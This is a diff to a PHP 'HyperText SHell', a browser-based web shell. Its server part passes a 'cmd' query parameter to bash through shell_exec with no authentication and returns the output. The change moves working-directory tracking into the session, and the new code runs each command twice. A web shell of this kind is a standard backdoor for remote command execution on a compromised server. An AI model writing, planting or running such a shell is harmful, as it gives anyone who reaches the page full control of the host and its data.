@@ -1,12 +1,14 @@
 <?php
+    session_start();
+
     if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-        $cmd = json_decode($_GET['cd']);
-        array_push($cmd, 'bash -c "'.addslashes($_GET["cmd"]).'" 2>&1');
-        $cmd = implode(";", $cmd);
-        //$cmd = 'bash -c "'.addslashes($_GET["cmd"]).'" 2>&1';
-        //var_dump(json_decode($_GET['cd']));
-        //die($cmd);
-        die(nl2br(htmlspecialchars(shell_exec($cmd))));
+
+        if(!isset($_SESSION['cwd']))
+            $_SESSION['cwd'] = getcwd();
+        chdir($_SESSION['cwd']);
+        $output = htmlspecialchars(shell_exec('bash -c "'.addslashes($_GET["cmd"]).'; echo ""; pwd" 2>&1'));
+        $_SESSION['cwd'] = end(explode("\n", trim($output)));
+        die(nl2br(htmlspecialchars(shell_exec('bash -c "'.addslashes($_GET["cmd"]).'" 2>&1'))));
     }
 ?>
 <!DOCTYPE html>
@@ -63,14 +65,14 @@ Welcome to HyperText SHell.
             var history_index = -1;
             const history = [];
             let buffer_temp = "";
-            const cd = [];
+            //const cd = [];
 
             function printMOTD() {
                 htsh.innerHTML += motd.replaceAll(' ', "&nbsp;").replaceAll('\n','<br />');
             }
 
             function show_prompt() {
-                fetch(url+"?cmd="+encodeURIComponent("pwd")+"&cd="+encodeURIComponent(JSON.stringify(cd)),{method: 'POST'})
+                fetch(url+"?cmd="+encodeURIComponent("pwd"),{method: 'POST', credentials: 'include'})
                 .then((response) => response.text())
                 .then((result) => {
                     path = result.replaceAll("<br />","").trim();
@@ -95,11 +97,8 @@ Welcome to HyperText SHell.
                 htsh.innerHTML += "<br/>";
                 buffer.disabled=true;
 
-                if (cmd.startsWith('cd ')) {
-                    cd.push(cmd);
-                }
                 console.log(user+"@"+host+":"+path+"$ "+cmd);
-                fetch(url+"?cmd="+encodeURIComponent(cmd)+"&cd="+encodeURIComponent(JSON.stringify(cd)),{method: 'POST'})
+                fetch(url+"?cmd="+encodeURIComponent(cmd),{method: 'POST'})
                 .then((response) => response.text())
                 .then((result) => {
                     htsh.innerHTML += result;
